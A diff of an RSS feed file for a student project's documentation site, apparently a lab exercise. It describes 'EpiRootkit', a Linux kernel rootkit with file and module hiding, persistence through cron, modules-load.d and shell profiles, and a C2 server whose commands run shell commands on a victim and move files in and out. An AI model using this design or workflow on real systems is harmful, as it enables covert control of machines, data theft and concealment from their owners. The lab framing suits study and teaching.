@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Tue, 20 May 2025 13:31:32 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Mon, 26 May 2025 02:07:50 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -71,14 +71,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="ecdfabTab" data-bs-toggle="tab" data-bs-target="#ecdfab"
-		 type="button" role="tab" aria-controls="ecdfab" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="acfedbTab" data-bs-toggle="tab" data-bs-target="#acfedb"
+		 type="button" role="tab" aria-controls="acfedb" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="defbacTab" data-bs-toggle="tab" data-bs-target="#defbac"
-		 type="button" role="tab" aria-controls="defbac" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="cbfadeTab" data-bs-toggle="tab" data-bs-target="#cbfade"
+		 type="button" role="tab" aria-controls="cbfade" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -95,7 +95,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="ecdfab" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="acfedb" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
 &lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
@@ -205,57 +205,8 @@ Or both VMs with:
 &lt;/ul>
 &lt;/li>
 &lt;li>
-&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h2 id="todo-implement-additional-c2-server-features">TODO: Implement Additional C2 Server Features &lt;a href="#todo-implement-additional-c2-server-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Basic client management (listing, alias, status)&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Encrypted web UI integration (React, real-time event log, terminal, upload/download panels)&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Command execution (CLI and web UI)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add advanced client management (grouping, advanced aliasing)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add audit logging and event history&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement advanced command scheduling&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add more robust error handling and reporting&lt;/li>
-&lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="attacking-program-c2-server-installation">Attacking Program (C2 Server) Installation &lt;a href="#attacking-program-c2-server-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu system. Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Host Environment Setup&lt;/a> and &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/vm-installation/'>&lt;p>SETUP&lt;/p>&lt;strong>VM Installation &amp; Verification&lt;/strong>&lt;br>Set up and verify the attacker and victim VMs from scratch.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/vm-installation/">VM Installation&lt;/a> first.&lt;/p>
-&lt;/blockquote>
-&lt;h2 id="1-deployment">1. Deployment &lt;a href="#1-deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
-&lt;nav>
-	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
-
-		
-		
-		
-		
-
-		
-
-		&lt;a class="nav-link active"
-		 id="bdcaefTab" data-bs-toggle="tab" data-bs-target="#bdcaef"
-		 type="button" role="tab" aria-controls="bdcaef" aria-selected="true">Deploy the Full Stack (Recommended)&lt;/a>
-
-		
-
-		&lt;a class="nav-link "
-		 id="bfcaedTab" data-bs-toggle="tab" data-bs-target="#bfcaed"
-		 type="button" role="tab" aria-controls="bfcaed" aria-selected="true">Manual Setup (Advanced)&lt;/a>
-
-		
-
-	&lt;/div>
-&lt;/nav>
-
-&lt;div class="tab-content" id="nav-tab-content">
-
-	
-
-
-
-
-
-
-&lt;div class="tab-pane fade show active" id="bdcaef" role="tabpanel" aria-labelledby="nav-1">
-
-	&lt;p>The simplest way to build and launch both the frontend and backend is with the provided script:&lt;/p></description></item><item><title>Usage &amp; CLI Commands</title><link>/docs/03-attacking-program/usage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="running-the-server">Running the Server &lt;a href="#running-the-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>In the &lt;code>attacking_program&lt;/code> directory, run:&lt;/p>
-
+&lt;p>When finished, close the QEMU window or use &lt;strong>Ctrl+C&lt;/strong> on the host script to shut down both VMs.&lt;/p></description></item><item><title>README</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="attacking-program-overview">Attacking Program Overview &lt;a href="#attacking-program-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional C2 (Command &amp;amp; Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.&lt;/p>
+&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -270,58 +221,167 @@ Or both VMs with:
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="ef539d5" class="language-bash ">
- &lt;code>pnpm start
-# Or
-npm start&lt;/code>
+ &lt;pre id="e92f0d9" class="language-bash ">
+ &lt;code># Install and start
+cd attacking_program &amp;amp;&amp;amp; pnpm install &amp;amp;&amp;amp; pnpm start
+# Server started on port 4444
+# Web interface: http://localhost:3000
+
+# Basic usage
+c2-server$ ls
+# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM
+
+c2-server$ auth Client-1 password
+# ✓ Authentication successful&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>The server starts automatically and presents the &lt;code>c2-server$ &lt;/code> prompt. Real-time event logs appear in the console.&lt;/p>
-&lt;h2 id="cli-commands">CLI Commands &lt;a href="#cli-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
+&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>CLI Interface&lt;/strong>: Vorpal.js-based interactive commands&lt;/li>
+&lt;li>&lt;strong>C2 Server&lt;/strong>: Node.js TCP server for rootkit communication&lt;/li>
+&lt;li>&lt;strong>Web Interface&lt;/strong>: Basic REST API and Socket.IO dashboard&lt;/li>
+&lt;/ul>
+&lt;h3 id="technology-stack">Technology Stack &lt;a href="#technology-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Runtime&lt;/strong>: Node.js 18+ with pnpm package manager&lt;/li>
+&lt;li>&lt;strong>CLI&lt;/strong>: Vorpal.js for interactive command interface&lt;/li>
+&lt;li>&lt;strong>Server&lt;/strong>: Express.js with Socket.IO for real-time updates&lt;/li>
+&lt;li>&lt;strong>Encryption&lt;/strong>: Optional XOR cipher for traffic obfuscation (currently disabled on rootkit side)&lt;/li>
+&lt;/ul>
+&lt;h2 id="cli-commands">CLI Commands &lt;a href="#cli-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="780d04c" class="language-bash ">
+ &lt;code>ls # List connected clients
+auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt; # Authenticate with client using dynamic password
+status &amp;lt;client&amp;gt; # Get client status information
+config &amp;lt;client&amp;gt; # Interactive configuration menu&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="operations">Operations &lt;a href="#operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="ae92741" class="language-bash ">
+ &lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command&amp;gt; # Execute shell command
+upload &amp;lt;client&amp;gt; &amp;lt;local&amp;gt; &amp;lt;remote&amp;gt; # Upload file to victim
+download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; &amp;lt;local&amp;gt; # Download file from victim&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="interactive-configuration">Interactive Configuration &lt;a href="#interactive-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="a1f1a2b" class="language-bash ">
+ &lt;code>c2-server$ config Client-1
+# ┌─ Rootkit Configuration - Client-1
+# • [X] Module Hiding: ENABLED
+# • [X] Persistence: ENABLED
+# 
+# ? Select option: Toggle Module Hiding
+# ✓ Module hiding disabled&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Available options:&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands with real examples.&lt;/p>
+&lt;h2 id="core-commands">Core Commands &lt;a href="#core-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
  &lt;thead>
  &lt;tr>
  &lt;th>Command&lt;/th>
- &lt;th>Aliases&lt;/th>
  &lt;th>Description&lt;/th>
+ &lt;th>Authentication Required&lt;/th>
  &lt;/tr>
  &lt;/thead>
  &lt;tbody>
  &lt;tr>
- &lt;td>&lt;code>server start&lt;/code>&lt;/td>
- &lt;td>&lt;code>start&lt;/code>&lt;/td>
- &lt;td>Starts TCP server (auto-starts with &lt;code>pnpm start&lt;/code>).&lt;/td>
+ &lt;td>&lt;code>clients, ls&lt;/code>&lt;/td>
+ &lt;td>List connected rootkit clients&lt;/td>
+ &lt;td>No&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>server stop&lt;/code>&lt;/td>
- &lt;td>&lt;code>stop&lt;/code>&lt;/td>
- &lt;td>Stops TCP server.&lt;/td>
+ &lt;td>&lt;code>auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt;&lt;/code>&lt;/td>
+ &lt;td>Authenticate with a rootkit client&lt;/td>
+ &lt;td>No&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>clients list&lt;/code>&lt;/td>
- &lt;td>&lt;code>ls&lt;/code>, &lt;code>list&lt;/code>&lt;/td>
- &lt;td>Lists connected clients (alias, ID, auth status, last ping).&lt;/td>
+ &lt;td>&lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command...&amp;gt;&lt;/code>&lt;/td>
+ &lt;td>Execute shell commands on target system&lt;/td>
+ &lt;td>Yes&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>send &amp;lt;clientAlias&amp;gt; &amp;lt;command...&amp;gt;&lt;/code>&lt;/td>
- &lt;td>&lt;/td>
- &lt;td>Sends &lt;code>&amp;lt;command...&amp;gt;&lt;/code> to specified &lt;code>&amp;lt;clientAlias&amp;gt;&lt;/code>.&lt;/td>
+ &lt;td>&lt;code>upload &amp;lt;client&amp;gt; &amp;lt;localFile&amp;gt; [remoteFile]&lt;/code>&lt;/td>
+ &lt;td>Upload files from attacking machine to victim system&lt;/td>
+ &lt;td>Yes&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>exit&lt;/code>&lt;/td>
- &lt;td>&lt;code>quit&lt;/code>&lt;/td>
- &lt;td>Stops server and exits application.&lt;/td>
+ &lt;td>&lt;code>download &amp;lt;client&amp;gt; &amp;lt;remoteFile&amp;gt; [localFile]&lt;/code>&lt;/td>
+ &lt;td>Download files from victim system to attacking machine&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>status &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
+ &lt;td>Get comprehensive rootkit status&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>keepalive &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
+ &lt;td>Get detailed keepalive status&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>persist &amp;lt;client&amp;gt; [action]&lt;/code>&lt;/td>
+ &lt;td>Manage persistence mechanisms&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>config &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
+ &lt;td>Interactive configuration interface&lt;/td>
+ &lt;td>Yes&lt;/td>
  &lt;/tr>
  &lt;/tbody>
 &lt;/table>
+&lt;h2 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="ls--clients">&lt;code>ls&lt;/code> / &lt;code>clients&lt;/code> &lt;a href="#ls--clients" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>List connected rootkit clients with authentication status and last seen time.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/04-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-epirootkit/overview/</guid><description>&lt;h1 id="epirootkit">EpiRootkit &lt;a href="#epirootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).&lt;/p>
+&lt;h2 id="what-we-built">What We Built &lt;a href="#what-we-built" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>EpiRootkit is a kernel module that provides:&lt;/p>
 &lt;ul>
-&lt;li>&lt;code>&amp;lt;clientAlias&amp;gt;&lt;/code>: Target client alias (e.g., &lt;code>Client-1&lt;/code> from &lt;code>clients list&lt;/code>).&lt;/li>
-&lt;li>&lt;code>&amp;lt;command...&amp;gt;&lt;/code>: Command string for the victim machine.&lt;/li>
+&lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection to command &amp;amp; control server&lt;/li>
+&lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
+&lt;li>&lt;strong>File Transfer&lt;/strong>: Upload/download files between C2 and victim&lt;/li>
+&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 password verification with rate limiting&lt;/li>
+&lt;li>&lt;strong>Stealth&lt;/strong>: Hide module from &lt;code>lsmod&lt;/code> and hide files from directory listings&lt;/li>
+&lt;li>&lt;strong>Persistence&lt;/strong>: Multiple mechanisms to survive reboots&lt;/li>
 &lt;/ul>
-&lt;p>Event logs provide feedback on connections, authentication attempts, data exchanges, errors, and command results. When a command is executed on a rootkit and results (such as stdout, stderr, or exit status) are sent back, they will be displayed in these logs.&lt;/p></description></item><item><title>Configuration</title><link>/docs/03-attacking-program/configuration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/configuration/</guid><description>&lt;h1 id="c2-server-configuration">C2 Server Configuration &lt;a href="#c2-server-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
-&lt;p>&lt;strong>You must configure the C2 server before first use.&lt;/strong>&lt;/p>
-&lt;/blockquote>
-&lt;h2 id="1-configuration-file-env">1. Configuration File: &lt;code>.env&lt;/code> &lt;a href="#1-configuration-file-env" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>All critical settings are loaded from a &lt;code>.env&lt;/code> file in the &lt;code>attacking_program/&lt;/code> directory. If you haven&amp;rsquo;t already, copy the example:&lt;/p>
-
+&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -336,17 +396,12 @@ npm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="90df811" class="language-bash ">
- &lt;code>cp .env.example .env&lt;/code>
+ &lt;pre id="5ca7107" class="language- ">
+ &lt;code>C2 Server (Node.js) ←→ EpiRootkit (Kernel Module) ←→ Target System
+Port 4444 Network &amp;#43; Commands Linux Kernel 5.4.0&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Open &lt;code>.env&lt;/code> in your editor and set the following:&lt;/p>
-&lt;h3 id="required-settings">Required Settings &lt;a href="#required-settings" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;code>C2_PORT&lt;/code> — TCP port for EpiRootkit connections (default: 4444)&lt;/li>
-&lt;li>&lt;code>ENCRYPTION_KEY&lt;/code> — &lt;strong>Must be a 32-byte (256-bit) random string&lt;/strong>&lt;/li>
-&lt;li>&lt;code>PASSWORD_HASH&lt;/code> — &lt;strong>Must be a 128-character lowercase SHA512 hex string&lt;/strong>&lt;/li>
-&lt;/ul>
-&lt;h3 id="how-to-generate-secure-values">How to Generate Secure Values &lt;a href="#how-to-generate-secure-values" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;h4 id="generate-a-32-byte-encryption_key">Generate a 32-byte ENCRYPTION_KEY &lt;a href="#generate-a-32-byte-encryption_key" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h4>
+&lt;h2 id="quick-demo">Quick Demo &lt;a href="#quick-demo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -361,25 +416,50 @@ npm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="c1c24f1" class="language-bash ">
- &lt;code>head -c 32 /dev/urandom | base64 | head -c 32&lt;/code>
+ &lt;pre id="4c298e8" class="language-bash ">
+ &lt;code># 1. Build and load rootkit
+cd rootkit &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo insmod epirootkit.ko
+
+# 2. Start C2 server 
+cd attacking_program &amp;amp;&amp;amp; pnpm start
+
+# 3. Use the rootkit
+c2-server$ auth Client-1 password
+c2-server$ exec Client-1 whoami
+c2-server$ status Client-1&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Paste this value into your &lt;code>.env&lt;/code> as &lt;code>ENCRYPTION_KEY&lt;/code>.&lt;/p></description></item><item><title>Security Features</title><link>/docs/03-attacking-program/security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/security/</guid><description>&lt;h2 id="todo-implement-security-features">TODO: Implement Security Features &lt;a href="#todo-implement-security-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Enforce end-to-end encryption for all C2 traffic (AES-256-GCM)&lt;/li>
-&lt;li>&lt;input checked="" disabled="" type="checkbox"> Password authentication (SHA512, configurable)&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add configurable password policies&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Implement multi-factor authentication for operators&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Add rate limiting and brute-force protection&lt;/li>
-&lt;li>&lt;input disabled="" type="checkbox"> Document all security mechanisms in detail&lt;/li>
+&lt;h2 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="network-layer">Network Layer &lt;a href="#network-layer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Connection Management&lt;/strong>: Persistent TCP connection with auto-reconnect&lt;/li>
+&lt;li>&lt;strong>Keepalive System&lt;/strong>: 60-second ping/pong to detect disconnections&lt;/li>
+&lt;li>&lt;strong>Socket Handling&lt;/strong>: Low-level network operations&lt;/li>
 &lt;/ul>
-&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p>
-&lt;p>The C2 server employs two main security mechanisms:&lt;/p>
-&lt;h2 id="1-message-encryption-aes-256-gcm">1. Message Encryption: AES-256-GCM &lt;a href="#1-message-encryption-aes-256-gcm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>Purpose: Encrypts all TCP C2 traffic for confidentiality, integrity, and authenticity.&lt;/li>
-&lt;li>Key: Uses a 32-byte &lt;code>ENCRYPTION_KEY&lt;/code> (must be changed from default and kept secret).&lt;/li>
-&lt;li>Format: Encrypted messages are transmitted as a colon-separated string: &lt;code>iv_hex:authtag_hex:ciphertext_hex&lt;/code>.&lt;/li>
-&lt;li>Details: See &lt;code>src/utils/encryption.js&lt;/code> and &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/configuration/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
+&lt;h3 id="command-system">Command System &lt;a href="#command-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Authentication&lt;/strong>: &lt;code>auth&lt;/code> - SHA-512 password verification&lt;/li>
+&lt;li>&lt;strong>Execution&lt;/strong>: &lt;code>exec&lt;/code> - Run shell commands with output capture&lt;/li>
+&lt;li>&lt;strong>File Operations&lt;/strong>: &lt;code>upload&lt;/code>/&lt;code>download&lt;/code> - Transfer files&lt;/li>
+&lt;li>&lt;strong>Status&lt;/strong>: &lt;code>status&lt;/code> - Get rootkit information&lt;/li>
+&lt;li>&lt;strong>Persistence&lt;/strong>: &lt;code>persist_*&lt;/code> - Install/remove boot persistence&lt;/li>
+&lt;li>&lt;strong>Stealth&lt;/strong>: &lt;code>hide_module&lt;/code>/&lt;code>unhide_module&lt;/code> - Toggle visibility&lt;/li>
+&lt;/ul>
+&lt;h3 id="stealth-features">Stealth Features &lt;a href="#stealth-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Module Hiding&lt;/strong>: Remove from kernel module list (&lt;code>lsmod&lt;/code>)&lt;/li>
+&lt;li>&lt;strong>File Hiding&lt;/strong>: Hide files with specific prefixes from directory listings&lt;/li>
+&lt;li>&lt;strong>Syscall Hooking&lt;/strong>: Uses kretprobe on &lt;code>getdents64&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="persistence-mechanisms">Persistence Mechanisms &lt;a href="#persistence-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>modules-load.d&lt;/strong>: Systemd automatic module loading&lt;/li>
+&lt;li>&lt;strong>Cron Jobs&lt;/strong>: Scheduled module loading&lt;/li>
+&lt;li>&lt;strong>Shell Profiles&lt;/strong>: Load via user login scripts&lt;/li>
+&lt;/ul>
+&lt;h2 id="technical-details">Technical Details &lt;a href="#technical-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS with kernel 5.4.0&lt;/li>
+&lt;li>&lt;strong>Language&lt;/strong>: C (kernel module) + Node.js (C2 server)&lt;/li>
+&lt;li>&lt;strong>APIs Used&lt;/strong>: ftrace, kretprobe, VFS, crypto API&lt;/li>
+&lt;li>&lt;strong>Network&lt;/strong>: TCP on port 4444 (configurable)&lt;/li>
+&lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
+&lt;/ul>
